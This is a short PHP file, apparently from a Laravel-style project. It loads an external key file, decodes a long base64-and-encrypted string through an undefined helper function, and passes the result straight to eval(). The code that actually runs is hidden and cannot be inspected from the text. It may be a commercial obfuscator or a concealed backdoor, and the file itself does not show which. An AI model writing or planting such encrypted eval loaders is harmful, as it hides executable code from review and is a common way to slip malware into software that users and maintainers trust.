<?php
$keyfile = public_path("key.inc.php");

if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
if(file_exists($keyfile)){include_once($keyfile);}else{die("<h2>include: $keyfile not found!</h2>");}
$e7091="SUw0akNpTEV4eWtqV3pmeUJyMDVnTFpjZEJnYmxpMmp0UTY1TG5uTWpkejVpMEYyMzJZaEJzc3J5WFEzQVFyUXVSS0hrOFRPRVVvNlJkMzBYQitmY1VraXpoT0p4TU13ME5KcGFwT1ZzSEpZTkZCR2hERms4eHRWaUViaGFpakQ1Y2M0eXlVelFWbTdGdkNxVUdvbkFwVkgvS21IZzUrQ0w3bHVyekdrcFEwbjhtTWtvQ2NCK3JINmFaRE1rUmJFTjU4UGJHSytwL1dRckZ0NXN0ZjVOMmROa3Zxd09qa3lMM2ZOaFZKODM2LzdueTNselZoSmdyMEk2eWhvMWsrTXVmT0hjUm9tUVR1K0M1a3c2OGlabFE9PQ==";eval(e7061($e7091));
